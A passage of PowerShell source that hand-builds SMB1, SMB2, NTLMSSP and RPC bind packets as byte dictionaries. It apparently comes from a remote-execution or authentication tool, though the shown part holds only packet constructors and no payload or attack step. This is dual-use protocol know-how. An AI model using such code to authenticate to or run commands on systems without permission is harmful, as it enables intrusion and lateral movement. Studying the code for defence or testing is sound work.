    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_WordCount",[Byte[]](0x04))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXCommand",[Byte[]](0xff))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Reserved",[Byte[]](0x00))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_AndXOffset",[Byte[]](0x00,0x00))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Flags",[Byte[]](0x00,0x00))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_PasswordLength",[Byte[]](0x01,0x00))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_ByteCount",$packet_path_length)

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Password",[Byte[]](0x00))

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Tree",$packet_path)

    $packet_SMBTreeConnectAndXRequest.Add("SMBTreeConnectAndXRequest_Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))



    return $packet_SMBTreeConnectAndXRequest

}



function Get-PacketSMBNTCreateAndXRequest()

{

    param([Byte[]]$packet_named_pipe)



    [Byte[]]$packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)

    $packet_named_pipe_length = $packet_named_pipe_length[0,1]

    [Byte[]]$packet_file_name_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length - 1)

    $packet_file_name_length = $packet_file_name_length[0,1]



    $packet_SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_WordCount",[Byte[]](0x18))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXCommand",[Byte[]](0xff))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved",[Byte[]](0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AndXOffset",[Byte[]](0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Reserved2",[Byte[]](0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileNameLen",$packet_file_name_length)

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_RootFID",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Disposition",[Byte[]](0x01,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_SecurityFlags",[Byte[]](0x00))

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_ByteCount",$packet_named_pipe_length)

    $packet_SMBNTCreateAndXRequest.Add("SMBNTCreateAndXRequest_Filename",$packet_named_pipe)



    return $packet_SMBNTCreateAndXRequest

}



function Get-PacketSMBReadAndXRequest()

{

    $packet_SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_WordCount",[Byte[]](0x0a))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXCommand",[Byte[]](0xff))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Reserved",[Byte[]](0x00))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_AndXOffset",[Byte[]](0x00,0x00))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_FID",[Byte[]](0x00,0x40))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MaxCountLow",[Byte[]](0x58,0x02))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_MinCount",[Byte[]](0x58,0x02))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Unknown",[Byte[]](0xff,0xff,0xff,0xff))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_Remaining",[Byte[]](0x00,0x00))

    $packet_SMBReadAndXRequest.Add("SMBReadAndXRequest_ByteCount",[Byte[]](0x00,0x00))



    return $packet_SMBReadAndXRequest

}



function Get-PacketSMBWriteAndXRequest()

{

    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)



    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

    $packet_write_length = $packet_write_length[0,1]



    $packet_SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WordCount",[Byte[]](0x0e))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXCommand",[Byte[]](0xff))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved",[Byte[]](0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_AndXOffset",[Byte[]](0x00,0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_FID",$packet_file_ID)

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Offset",[Byte[]](0xea,0x03,0x00,0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Reserved2",[Byte[]](0xff,0xff,0xff,0xff))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_WriteMode",[Byte[]](0x08,0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_Remaining",$packet_write_length)

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthHigh",[Byte[]](0x00,0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataLengthLow",$packet_write_length)

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_DataOffset",[Byte[]](0x3f,0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_HighOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMBWriteAndXRequest.Add("SMBWriteAndXRequest_ByteCount",$packet_write_length)



    return $packet_SMBWriteAndXRequest

}



function Get-PacketSMBCloseRequest()

{

    param ([Byte[]]$packet_file_ID)



    $packet_SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBCloseRequest.Add("SMBCloseRequest_WordCount",[Byte[]](0x03))

    $packet_SMBCloseRequest.Add("SMBCloseRequest_FID",$packet_file_ID)

    $packet_SMBCloseRequest.Add("SMBCloseRequest_LastWrite",[Byte[]](0xff,0xff,0xff,0xff))

    $packet_SMBCloseRequest.Add("SMBCloseRequest_ByteCount",[Byte[]](0x00,0x00))



    return $packet_SMBCloseRequest

}



function Get-PacketSMBTreeDisconnectRequest()

{

    $packet_SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_WordCount",[Byte[]](0x00))

    $packet_SMBTreeDisconnectRequest.Add("SMBTreeDisconnectRequest_ByteCount",[Byte[]](0x00,0x00))



    return $packet_SMBTreeDisconnectRequest

}



function Get-PacketSMBLogoffAndXRequest()

{

    $packet_SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_WordCount",[Byte[]](0x02))

    $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXCommand",[Byte[]](0xff))

    $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_Reserved",[Byte[]](0x00))

    $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_AndXOffset",[Byte[]](0x00,0x00))

    $packet_SMBLogoffAndXRequest.Add("SMBLogoffAndXRequest_ByteCount",[Byte[]](0x00,0x00))



    return $packet_SMBLogoffAndXRequest

}



#SMB2



function Get-PacketSMB2Header()

{

    param([Byte[]]$packet_command,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)



    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00



    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))

    $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))

    $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))

    $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))

    $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))

    $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)

    $packet_SMB2Header.Add("SMB2Header_CreditRequest",[Byte[]](0x00,0x00))

    $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)

    $packet_SMB2Header.Add("SMB2Header_Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)

    $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)

    $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))



    return $packet_SMB2Header

}



function Get-PacketSMB2NegotiateProtocolRequest()

{

    $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))

    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))



    return $packet_SMB2NegotiateProtocolRequest

}



function Get-PacketSMB2SessionSetupRequest()

{

    param([Byte[]]$packet_security_blob)



    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)

    $packet_security_blob_length = $packet_security_blob_length[0,1]



    $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)



    return $packet_SMB2SessionSetupRequest 

}



function Get-PacketSMB2TreeConnectRequest()

{

    param([Byte[]]$packet_path)



    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)

    $packet_path_length = $packet_path_length[0,1]



    $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))

    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))

    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))

    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)

    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)



    return $packet_SMB2TreeConnectRequest

}



function Get-PacketSMB2CreateRequestFile()

{

    param([Byte[]]$packet_named_pipe)



    $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)

    $packet_named_pipe_length = $packet_named_pipe_length[0,1]



    $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_StructureSize",[Byte[]](0x39,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Flags",[Byte[]](0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_RequestedOplockLevel",[Byte[]](0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameOffset",[Byte[]](0x78,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_NameLength",$packet_named_pipe_length)

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2CreateRequestFile.Add("SMB2CreateRequestFile_Buffer",$packet_named_pipe)



    return $packet_SMB2CreateRequestFile

}



function Get-PacketSMB2ReadRequest()

{

    param ([Byte[]]$packet_file_ID)



    $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_StructureSize",[Byte[]](0x31,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Padding",[Byte[]](0x50))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Flags",[Byte[]](0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Length",[Byte[]](0x00,0x00,0x10,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_FileID",$packet_file_ID)

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoOffset",[Byte[]](0x00,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_ReadChannelInfoLength",[Byte[]](0x00,0x00))

    $packet_SMB2ReadRequest.Add("SMB2ReadRequest_Buffer",[Byte[]](0x30))



    return $packet_SMB2ReadRequest

}



function Get-PacketSMB2WriteRequest()

{

    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)



    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)



    $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_StructureSize",[Byte[]](0x31,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_DataOffset",[Byte[]](0x70,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Length",$packet_write_length)

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_FileID",$packet_file_ID)

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoOffset",[Byte[]](0x00,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_WriteChannelInfoLength",[Byte[]](0x00,0x00))

    $packet_SMB2WriteRequest.Add("SMB2WriteRequest_Flags",[Byte[]](0x00,0x00,0x00,0x00))



    return $packet_SMB2WriteRequest

}



function Get-PacketSMB2CloseRequest()

{

    param ([Byte[]]$packet_file_ID)



    $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_StructureSize",[Byte[]](0x18,0x00))

    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Flags",[Byte[]](0x00,0x00))

    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SMB2CloseRequest.Add("SMB2CloseRequest_FileID",$packet_file_ID)



    return $packet_SMB2CloseRequest

}



function Get-PacketSMB2TreeDisconnectRequest()

{

    $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_StructureSize",[Byte[]](0x04,0x00))

    $packet_SMB2TreeDisconnectRequest.Add("SMB2TreeDisconnectRequest_Reserved",[Byte[]](0x00,0x00))



    return $packet_SMB2TreeDisconnectRequest

}



function Get-PacketSMB2SessionLogoffRequest()

{

    $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_StructureSize",[Byte[]](0x04,0x00))

    $packet_SMB2SessionLogoffRequest.Add("SMB2SessionLogoffRequest_Reserved",[Byte[]](0x00,0x00))



    return $packet_SMB2SessionLogoffRequest

}



#NTLM



function Get-PacketNTLMSSPNegotiate()

{

    param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)



    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)

    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]

    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32

    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22

    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20

    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2



    $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialContextTokenID",[Byte[]](0x60)) # the ASN.1 key names are likely not all correct

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InitialcontextTokenLength",$packet_ASN_length_1)

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechID",[Byte[]](0x06))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_ThisMechLength",[Byte[]](0x06))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID",[Byte[]](0xa0))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength",$packet_ASN_length_2)

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenID2",[Byte[]](0x30))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_InnerContextTokenLength2",$packet_ASN_length_3)

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID",[Byte[]](0xa0))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength",[Byte[]](0x0e))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID2",[Byte[]](0x30))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength2",[Byte[]](0x0c))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesID3",[Byte[]](0x06))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTypesLength3",[Byte[]](0x0a))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenID",[Byte[]](0xa2))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MechTokenLength",$packet_ASN_length_4)

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPID",[Byte[]](0x04))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NTLMSSPLength",$packet_NTLMSSP_length)

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_MessageType",[Byte[]](0x01,0x00,0x00,0x00))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_NegotiateFlags",$packet_negotiate_flags)

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))



    if($packet_version)

    {

        $packet_NTLMSSPNegotiate.Add("NTLMSSPNegotiate_Version",$packet_version)

    }



    return $packet_NTLMSSPNegotiate

}



function Get-PacketNTLMSSPAuth()

{

    param([Byte[]]$packet_NTLM_response)



    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)

    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]

    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)

    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]

    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)

    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]

    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)

    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]



    $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID",[Byte[]](0xa1,0x82))

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength",$packet_ASN_length_1)

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID2",[Byte[]](0x30,0x82))

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength2",$packet_ASN_length_2)

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNID3",[Byte[]](0xa2,0x82))

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_ASNLength3",$packet_ASN_length_3)

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPID",[Byte[]](0x04,0x82))

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMSSPLength",$packet_NTLMSSP_length)

    $packet_NTLMSSPAuth.Add("NTLMSSPAuth_NTLMResponse",$packet_NTLM_response)



    return $packet_NTLMSSPAuth

}



#RPC



function Get-PacketRPCBind()

{

    param([Int]$packet_call_ID,[Byte[]]$packet_max_frag,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)



    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)



    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_RPCBind.Add("RPCBind_Version",[Byte[]](0x05))

    $packet_RPCBind.Add("RPCBind_VersionMinor",[Byte[]](0x00))

    $packet_RPCBind.Add("RPCBind_PacketType",[Byte[]](0x0b))

    $packet_RPCBind.Add("RPCBind_PacketFlags",[Byte[]](0x03))

    $packet_RPCBind.Add("RPCBind_DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))

    $packet_RPCBind.Add("RPCBind_FragLength",[Byte[]](0x48,0x00))

    $packet_RPCBind.Add("RPCBind_AuthLength",[Byte[]](0x00,0x00))

    $packet_RPCBind.Add("RPCBind_CallID",$packet_call_ID_bytes)

    $packet_RPCBind.Add("RPCBind_MaxXmitFrag",[Byte[]](0xb8,0x10))

    $packet_RPCBind.Add("RPCBind_MaxRecvFrag",[Byte[]](0xb8,0x10))

    $packet_RPCBind.Add("RPCBind_AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_RPCBind.Add("RPCBind_NumCtxItems",$packet_num_ctx_items)

    $packet_RPCBind.Add("RPCBind_Unknown",[Byte[]](0x00,0x00,0x00))

    $packet_RPCBind.Add("RPCBind_ContextID",$packet_context_ID)

    $packet_RPCBind.Add("RPCBind_NumTransItems",[Byte[]](0x01))

    $packet_RPCBind.Add("RPCBind_Unknown2",[Byte[]](0x00))

    $packet_RPCBind.Add("RPCBind_Interface",$packet_UUID)

    $packet_RPCBind.Add("RPCBind_InterfaceVer",$packet_UUID_version)

    $packet_RPCBind.Add("RPCBind_InterfaceVerMinor",[Byte[]](0x00,0x00))

    $packet_RPCBind.Add("RPCBind_TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))

    $packet_RPCBind.Add("RPCBind_TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))



    if($packet_num_ctx_items[0] -eq 2)

    {

        $packet_RPCBind.Add("RPCBind_ContextID2",[Byte[]](0x01,0x00))

